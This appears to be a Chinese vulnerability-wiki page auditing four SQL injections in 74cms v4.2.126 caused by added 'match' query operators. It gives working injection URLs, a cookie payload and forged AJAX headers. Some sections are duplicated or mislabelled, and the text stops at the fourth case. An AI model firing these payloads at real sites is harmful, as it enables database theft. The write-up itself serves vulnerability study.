@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/74cms/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>74cms v4.2.126-前台四处sql注入 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "74cms v4.2.126-\u524d\u53f0\u56db\u5904sql\u6ce8\u5165", url: "#_top", children: [
+              {title: "0x00 \u524d\u8a00", url: "#0x00" },
+              {title: "0x01 74cms\u5347\u7ea7\u5230\u6700\u65b0\u7248", url: "#0x01-74cms" },
+              {title: "0x02 \u6982\u8981", url: "#0x02" },
+              {title: "0x03 \u6f0f\u6d1e\u8bb2\u89e3", url: "#0x03" },
+              {title: "0x04 74cms\u72ec\u6709\u6846\u67b6\u6f0f\u6d1e\u7b2c\u4e00\u5904", url: "#0x04-74cms" },
+              {title: "0x05 74cms\u72ec\u6709\u6846\u67b6\u6f0f\u6d1e\u7b2c\u4e8c\u5904", url: "#0x05-74cms" },
+              {title: "0x06 74cms\u72ec\u6709\u6846\u67b6\u6f0f\u6d1e\u7b2c\u4e8c\u5904", url: "#0x06-74cms" },
+              {title: "0x07 74cms\u72ec\u6709\u6846\u67b6\u6f0f\u6d1e\u7b2c\u4e09\u5904", url: "#0x07-74cms" },
+              {title: "0x07 74cms\u72ec\u6709\u6846\u67b6\u6f0f\u6d1e\u7b2c\u56db\u5904", url: "#0x07-74cms_1" },
+              {title: "\u56db\u3001\u53c2\u8003\u94fe\u63a5", url: "#_1" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../74cms%20v4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../74cms%20v4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../74cms%20v4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../74cms%20v4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        74cms v4.2.126-任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="74cms-v42126-sql">74cms v4.2.126-前台四处sql注入<a class="headerlink" href="#74cms-v42126-sql" title="Permanent link">&para;</a></h1>
+<h2 id="0x00">0x00 前言<a class="headerlink" href="#0x00" title="Permanent link">&para;</a></h2>
+<p>厂商：74cms下载地址：<a href="http://www.74cms.com/download/index.html关于版本">http://www.74cms.com/download/index.html关于版本</a>：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</p>
+<h2 id="0x01-74cms">0x01 74cms升级到最新版<a class="headerlink" href="#0x01-74cms" title="Permanent link">&para;</a></h2>
+<p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，
+搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[\'HTTP_HOST\'] 改为 <a href="http://baidu.com">http://baidu.com</a> 即可</p>
+<h2 id="0x02">0x02 概要<a class="headerlink" href="#0x02" title="Permanent link">&para;</a></h2>
+<dl>
+<dt>这个注入也是挺有趣的，如果不是我有比对源码的习惯的话，可能还找不到这个74cms独有的框架sql注入漏洞</dt>
+<dd>)这里我并不会脱离74cms重新讲一次相关的框架内容，所以读者最好，看看我之前的文章。ThinkPHP3.2.3框架实现安全数据库操作分析https://<a href="http://www.yuque.com/pmiaowu/bfgkkh/coglz1先看完上面的文章">www.yuque.com/pmiaowu/bfgkkh/coglz1先看完上面的文章</a>，然后在看此文章，会更简单的了解清楚。</dd>
+</dl>
+<h2 id="0x03">0x03 漏洞讲解<a class="headerlink" href="#0x03" title="Permanent link">&para;</a></h2>
+<p>非常抱歉，让读者看到前面 3节 不是很有营养的东西。在前面最开始的时候，我说过我有对比源码，使用手册的情况。所以这里我们继续在开始之前，我要使用在74cms这个代码里面写个例子，希望可以让你们看懂，因为文化水平不高=-=，写文章感觉和很多前辈差距挺大的。为了能够更直观，这里开启调试文件：74cms\upload\Application\Common\Conf\config.php添加多一行</p>
+<div class="codehilite"><pre><span></span><code>&#39;SHOW_PAGE_TRACE&#39;        =&gt;  true,
+</code></pre></div>
+
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId25.png" /></p>
+<p>然后打开文件：74cms\upload\Application\Home\Controller\IndexController.class.php添加代码：</p>
+<div class="codehilite"><pre><span></span><code><span class="err">$</span><span class="n">uid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">I</span><span class="p">(</span><span class="s">&#39;GET.uid&#39;</span><span class="p">);</span>
+<span class="n">M</span><span class="p">(</span><span class="s">&#39;CompanyProfile&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">field</span><span class="p">(</span><span class="s">&#39;companyname,logo&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">where</span><span class="p">(</span><span class="n">array</span><span class="p">(</span><span class="s">&#39;uid&#39;</span><span class="o">=&gt;</span><span class="err">$</span><span class="n">uid</span><span class="p">))</span><span class="o">-&gt;</span><span class="n">find</span><span class="p">();</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId26.png" /></p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId27.png" /></p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId28.png" /></p>
+<p>我感觉到这里可能有人要骂我了。应该有人会： 你个瓜皮，你家审计可以自己加代码的？是的是的，的却不能加。我这样也是想让更多的人能够简单的看懂这个漏洞那么我们通过这个也能知道一般这种情况，是没得注入的了，而且应为使用了系统函数
+I 所以也是没有框架注入这一说。这里又要重新重复讲解I函数的作用了在我的眼中I函数就是一个为了解决框架底层设计问题的函数</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId29.png" /></p>
+<p>神奇的I函数路径:ThinkPHP\Common\functions.php方法名：function I($name,$default=\'\',$filter=null,$datas=null)</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId30.png" /></p>
+<p>这个函数的主要功能为3个1， 确定数据类型2， 对数据进行循环取值3， 调用think_filter 函数进行过滤think_filter函数分析</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId31.png" /></p>
+<div class="codehilite"><pre><span></span><code>例如：
+    没有使用think_filter 函数时
+goods_name[0]=in&amp;goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&amp;goods_name[2]=exp
+
+使用了think_filter函数时
+  goods_name[0]=in &amp;goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&amp;goods_name[2]=exp
+  注意：使用了think_filter函数时 in后面是有空格的也就是说返回值是
+goods_name[0]=in(空格)&amp;goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&amp;goods_name[2]=exp
+而正是这个空格的问题，就可以修复掉可能发生的框架注入问题。
+</code></pre></div>
+
+<p>接着我们直接打开文件：74cms\upload\ThinkPHP\Library\Think\Db\Driver.class.php</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId32.png" /></p>
+<div class="codehilite"><pre><span></span><code>think_filter函数与上图两者对比一下，是否发现多点了东西？
+是的没错了。
+74cms 修改了tp底层添加了
+3个新方法：
+match
+  match_mode
+  match_with
+
+也就是说这3个方法我们是可以绕过 I 函数的过滤的
+
+接着查看：parseWhereItem( 方法
+</code></pre></div>
+
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId33.png" /></p>
+<p>使用的是直接字符串拼接的方式入库，故判断此漏洞可利用.注意了上图我们可控制的点是 $str 而 $str 给双引号包含！！！！！！！最开始的时候，记得我说过么，系统默认I 会过滤 "双引号"
+而导致此注入不可用，那么就需要找一处不经过I函数或是说不过滤双引号的地方来构造漏洞。这里我们重新修改一下例子：打开文件：
+74cms\upload\Application\Home\Controller\IndexController.class.php</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId34.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="err">输入</span><span class="n">url</span><span class="o">:</span><span class="w"> </span><span class="n">http</span><span class="o">://</span><span class="mi">74</span><span class="n">cms</span><span class="o">.</span><span class="na">test</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="na">php</span><span class="o">?</span><span class="n">m</span><span class="o">=</span><span class="n">Home</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">index</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">index</span><span class="o">&amp;</span><span class="n">uid</span><span class="o">[</span><span class="mi">0</span><span class="o">]=</span><span class="n">match</span><span class="o">&amp;</span><span class="n">uid</span><span class="o">[</span><span class="mi">1</span><span class="o">][</span><span class="mi">0</span><span class="o">]=</span><span class="n">aaaaaaa</span><span class="err">&quot;</span><span class="o">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">updatexml</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span><span class="n">concat</span><span class="o">(</span><span class="mh">0x7e</span><span class="o">,(</span><span class="n">select</span><span class="w"> </span><span class="n">user</span><span class="o">())),</span><span class="mi">0</span><span class="o">)</span><span class="w"> </span><span class="err">–</span><span class="w"> </span><span class="n">a</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId35.png" /></p>
+<p>这样的话，这个注入就是可用的了。理解了这个以后，我们也算是挖到了74cms独有的框架漏洞。接下来整理一下会发生注入的情况M()-&gt;where($test)-&gt;xx那么只要 where中任意参数可控，并不会过滤 双引号即可！然后就没什么技术含量了使用ide进行搜索测试即可确定漏洞，经过一顿搜索以后</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId36.png" /></p>
+<dl>
+<dt>前端发现一共有四处，也就是说这个框架漏洞，可以利用的地方只有四处。后端注入，除了挖src，不然我都认为他是没有什么用。所以后端能不能利用我也不知道。我没去看</dt>
+<dd>)</dd>
+</dl>
+<h2 id="0x04-74cms">0x04 74cms独有框架漏洞第一处<a class="headerlink" href="#0x04-74cms" title="Permanent link">&para;</a></h2>
+<p>文件：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php方法：function company_focus($company_id)是否需登录：需要登录权限：普通用户即可为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。登录后台</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId38.png" /></p>
+<p>注册完成以后登录前台即可如果不登录的话，会显示这个样子url:<a href="http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company">http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company</a>_focus</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId39.png" /></p>
+<div class="codehilite"><pre><span></span><code>http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus&amp;company_id[0]=match&amp;company_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a
+</code></pre></div>
+
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId40.png" /></p>
+<p>看源码</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId41.png" /></p>
+<p>打开文件：
+74cms\upload\Application\Common\Model\PersonalFocusCompanyModel.class.php方法：add_focus(</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId42.png" /></p>
+<h2 id="0x05-74cms">0x05 74cms独有框架漏洞第二处<a class="headerlink" href="#0x05-74cms" title="Permanent link">&para;</a></h2>
+<p>文件：74cms\upload\Application\Home\Controller\CompanyServiceController.class.php方法：order_pay_finish(是否需登录：需要登录权限：企业用户即可看源码</p>
+<p>image</p>
+<p>为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId44.png" /></p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId45.png" /></p>
+<p>注册完成以后登录前台即可</p>
+<div class="codehilite"><pre><span></span><code><span class="n">url</span><span class="o">:</span><span class="w"> </span><span class="n">http</span><span class="o">://</span><span class="mi">74</span><span class="n">cms</span><span class="o">.</span><span class="na">test</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="na">php</span><span class="o">?</span><span class="n">m</span><span class="o">=&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">CompanyService</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">order_pay_finish</span><span class="o">&amp;</span><span class="n">order_id</span><span class="o">[</span><span class="mi">0</span><span class="o">]=</span><span class="n">match</span><span class="o">&amp;</span><span class="n">order_id</span><span class="o">[</span><span class="mi">1</span><span class="o">][</span><span class="mi">0</span><span class="o">]=</span><span class="n">aaaaaaa</span><span class="err">&quot;</span><span class="o">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">updatexml</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span><span class="n">concat</span><span class="o">(</span><span class="mh">0x7e</span><span class="o">,(</span><span class="n">select</span><span class="w"> </span><span class="n">user</span><span class="o">())),</span><span class="mi">0</span><span class="o">)</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="n">a</span>
+
+<span class="err">如果不登录的话，会显示这个样子</span>
+<span class="n">url</span><span class="o">:</span><span class="n">http</span><span class="o">://</span><span class="mi">74</span><span class="n">cms</span><span class="o">.</span><span class="na">test</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="na">php</span><span class="o">?</span><span class="n">m</span><span class="o">=&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">AjaxPersonal</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">company_focus</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId46.png" /></p>
+<div class="codehilite"><pre><span></span><code>http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus&amp;company_id[0]=match&amp;company_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a
+</code></pre></div>
+
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId47.png" /></p>
+<p>看源码</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId48.png" /></p>
+<p>打开文件：
+74cms\upload\Application\Common\Model\PersonalFocusCompanyModel.class.php方法：add_focus(</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId49.png" /></p>
+<h2 id="0x06-74cms">0x06 74cms独有框架漏洞第二处<a class="headerlink" href="#0x06-74cms" title="Permanent link">&para;</a></h2>
+<p>文件：74cms\upload\Application\Home\Controller\CompanyServiceController.class.php方法：order_pay_finish(是否需登录：需要登录权限：企业用户即可看源码</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId51.png" /></p>
+<p>为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId52.png" /></p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId53.png" /></p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId54.png" /></p>
+<p>注册完成以后登录前台即可</p>
+<div class="codehilite"><pre><span></span><code><span class="n">url</span><span class="o">:</span><span class="w"> </span><span class="n">http</span><span class="o">://</span><span class="mi">74</span><span class="n">cms</span><span class="o">.</span><span class="na">test</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="na">php</span><span class="o">?</span><span class="n">m</span><span class="o">=&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">CompanyService</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">order_pay_finish</span><span class="o">&amp;</span><span class="n">order_id</span><span class="o">[</span><span class="mi">0</span><span class="o">]=</span><span class="n">match</span><span class="o">&amp;</span><span class="n">order_id</span><span class="o">[</span><span class="mi">1</span><span class="o">][</span><span class="mi">0</span><span class="o">]=</span><span class="n">aaaaaaa</span><span class="err">&quot;</span><span class="o">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">updatexml</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span><span class="n">concat</span><span class="o">(</span><span class="mh">0x7e</span><span class="o">,(</span><span class="n">select</span><span class="w"> </span><span class="n">user</span><span class="o">())),</span><span class="mi">0</span><span class="o">)</span><span class="w"> </span><span class="err">–</span><span class="w"> </span><span class="n">a</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId55.png" /></p>
+<h2 id="0x07-74cms">0x07 74cms独有框架漏洞第三处<a class="headerlink" href="#0x07-74cms" title="Permanent link">&para;</a></h2>
+<p>文件：74cms\upload\Application\Home\Controller\MembersController.class.php方法：register(是否需登录：不需要</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId57.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="nl">url</span><span class="p">:</span><span class="w"> </span>
+<span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mi">74</span><span class="n">cms</span><span class="p">.</span><span class="n">test</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="n">m</span><span class="o">=&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">Members</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">register</span>
+<span class="nl">post</span><span class="p">:</span><span class="w"> </span>
+<span class="n">reg_type</span><span class="o">=</span><span class="mi">2</span><span class="o">&amp;</span><span class="n">utype</span><span class="o">=</span><span class="mi">2</span><span class="o">&amp;</span><span class="n">ucenter</span><span class="o">=</span><span class="n">bind</span><span class="o">&amp;</span><span class="n">unbind_mobile</span><span class="o">=</span><span class="mi">1</span>
+
+<span class="nl">cookie</span><span class="p">:</span>
+<span class="n">members_uc_info</span><span class="o">[</span><span class="n">reg_type</span><span class="o">]=</span><span class="mi">1</span><span class="p">;</span><span class="n">members_uc_info</span><span class="o">[</span><span class="n">utype</span><span class="o">]=</span><span class="mi">2</span><span class="p">;</span><span class="n">members_uc_info</span><span class="o">[</span><span class="n">mobile</span><span class="o">][</span><span class="n">0</span><span class="o">]=</span><span class="k">match</span><span class="p">;</span><span class="n">members_uc_info</span><span class="o">[</span><span class="n">mobile</span><span class="o">][</span><span class="n">1</span><span class="o">][</span><span class="n">0</span><span class="o">]=</span><span class="n">aaaaaaa</span><span class="o">%</span><span class="mi">22</span><span class="p">)</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">())),</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="c1">-- a;</span>
+
+<span class="nl">headers</span><span class="p">:</span>
+<span class="w">  </span><span class="n">Content</span><span class="o">-</span><span class="nl">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
+<span class="w">  </span><span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="k">With</span><span class="err">:</span><span class="w"> </span><span class="n">XMLHttpRequest</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId58.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="n">这里我要大概讲一下参数的问题</span>
+<span class="nl">post</span><span class="p">:</span><span class="w"> </span>
+<span class="n">reg_type</span><span class="o">=</span><span class="mi">2</span><span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="n">必须为2</span><span class="w"> </span><span class="n">为了绕过一个注册判断</span><span class="err">，</span><span class="n">为1的话</span><span class="err">，</span><span class="n">会直接创建帐户</span><span class="err">，</span><span class="n">导致无法利用漏洞</span>
+<span class="n">utype</span><span class="o">=</span><span class="mi">2</span><span class="w">         </span><span class="o">//</span><span class="w"> </span><span class="n">判断会员类型的也必须为2</span><span class="w"> </span><span class="n">为1会直接创建一条数据</span><span class="err">，</span><span class="n">导致无法利用漏洞</span><span class="w">      </span>
+<span class="n">ucenter</span><span class="o">=</span><span class="n">bind</span><span class="w">           </span><span class="o">//</span><span class="w"> </span><span class="n">必须为bind因为要靠他</span><span class="err">，</span><span class="n">获取cookie</span><span class="p">(</span><span class="n">members_uc_info</span><span class="p">)</span><span class="n">并且合并为</span><span class="err">$</span><span class="n">data数组进行利用</span>
+<span class="w">  </span><span class="n">unbind_mobile</span><span class="o">=</span><span class="mi">1</span><span class="w">       </span><span class="o">//</span><span class="w"> </span><span class="n">只要有此字段即可</span><span class="err">，</span><span class="n">只是单纯为了满足流程判断的</span>
+
+<span class="nl">cookie</span><span class="p">:</span>
+<span class="n">members_uc_info</span><span class="o">[</span><span class="n">reg_type</span><span class="o">]=</span><span class="mi">1</span><span class="p">;</span><span class="w">         </span><span class="o">//</span><span class="w"> </span><span class="n">必须为1</span><span class="w"> </span><span class="n">满足流程需要</span>
+<span class="n">members_uc_info</span><span class="o">[</span><span class="n">utype</span><span class="o">]=</span><span class="mi">2</span><span class="p">;</span><span class="w">         </span><span class="o">//</span><span class="w"> </span><span class="n">必须为2</span><span class="w"> </span><span class="n">满足流程需要</span>
+<span class="n">members_uc_info</span><span class="o">[</span><span class="n">mobile</span><span class="o">][</span><span class="n">0</span><span class="o">]=</span><span class="k">match</span><span class="p">;</span><span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">框架漏洞利用</span>
+<span class="n">members_uc_info</span><span class="o">[</span><span class="n">mobile</span><span class="o">][</span><span class="n">1</span><span class="o">][</span><span class="n">0</span><span class="o">]=</span><span class="n">aaaaaaa</span><span class="o">%</span><span class="mi">22</span><span class="p">)</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">())),</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="c1">-- a;  // 这里输入注入语句</span>
+
+<span class="nl">headers</span><span class="p">:</span><span class="w">  </span><span class="o">//</span><span class="w"> </span><span class="n">伪造ajax操作</span>
+<span class="w">  </span><span class="n">Content</span><span class="o">-</span><span class="nl">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
+<span class="w">  </span><span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="k">With</span><span class="err">:</span><span class="w"> </span><span class="n">XMLHttpRequest</span>
+</code></pre></div>
+
+<h2 id="0x07-74cms_1">0x07 74cms独有框架漏洞第四处<a class="headerlink" href="#0x07-74cms_1" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><code><span class="n">文件</span><span class="err">：</span><span class="mi">74</span><span class="n">cms</span><span class="err">\</span><span class="n">upload</span><span class="err">\</span><span class="n">Application</span><span class="err">\</span><span class="n">Home</span><span class="err">\</span><span class="n">Controller</span><span class="err">\</span><span class="n">MembersController</span><span class="p">.</span><span class="k">class</span><span class="p">.</span><span class="n">php</span>
+<span class="n">方法</span><span class="err">：</span><span class="n">oauth_reg</span><span class="w"> </span><span class="p">(</span>
+<span class="n">是否需登录</span><span class="err">：</span><span class="n">需要</span>
